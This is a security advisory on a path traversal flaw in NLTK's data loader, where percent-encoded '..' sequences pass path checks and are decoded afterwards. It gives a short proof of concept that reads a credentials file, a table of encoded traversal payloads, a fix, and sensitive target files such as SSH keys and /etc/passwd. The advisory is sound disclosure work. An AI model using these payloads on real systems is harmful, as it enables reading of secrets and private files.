summary: "nltk: Arbitrary File Read via Path Traversal in nltk.data.load() through Percent-Encoded\
  \ Sequences\n# Summary\nnltk.data.load() and nltk.data.find() resolve user-supplied resource\
  \ names to filesystem paths using url2pathname(), which decodes percent-encoded sequences\
  \ (e.g. %2e%2e to ..). Path safety checks are performed on the raw, still-encoded string before\
  \ decoding occurs. An attacker supplying %2e%2e instead of .. bypasses all path validation\
  \ and reads arbitrary files outside the NLTK data directory.\n\n# Vulnerable Code\nnltk/data.py\
  \ - find() function:\n url2pathname() decodes %2e%2e -> .. AFTER any safety check\np = os.path.join(path_,\
  \ url2pathname(resource_name))\nif os.path.exists(p):\n    return FileSystemPathPointer(p)\n\
  \n# Proof of Concept\nimport nltk.data\nnltk.data.path = [\"/home/user/nltk_data\"]\n%2e%2e\
  \ decodes to .. via url2pathname(), escaping the data dir\ndata = nltk.data.load(\"%2e%2e/SECRET_credentials.txt\"\
  , format=\"raw\")\nprint(data)\n b'AWS_SECRET_KEY=AKIAIOSFODNN7EXAMPLE\\nDATABASE_PASS=hunter2\\\
  n'\nAll of these bypass path checks and decode identically:\n\n# Payload\tAfter url2pathname()\n\
  %2e%2e/secret\t../secret\n.%2e/secret\t../secret\n%2e./secret\t../secret\n%2E%2E/secret\t\
  ../secret\nRoot Cause\nurl2pathname() is called after path safety checks, not before. Encoding\
  \ .. as %2e%2e passes every check, then decodes to a traversal sequence at filesystem access\
  \ time.\n\n# Fix\nDecode before checking:\n\nfrom urllib.parse import unquote\nresource_name\
  \ = unquote(resource_name)  # decode first, then validate\n\n# Impact\nAn attacker who controls\
  \ the resource name passed to nltk.data.load() can read any file the process has permission\
  \ to access - credentials, environment files, SSH private keys, /etc/passwd, /proc/self/environ,\
  \ application config files, etc. This affects any application that passes user-controlled\
  \ input to nltk.data.load() or nltk.data.find()."
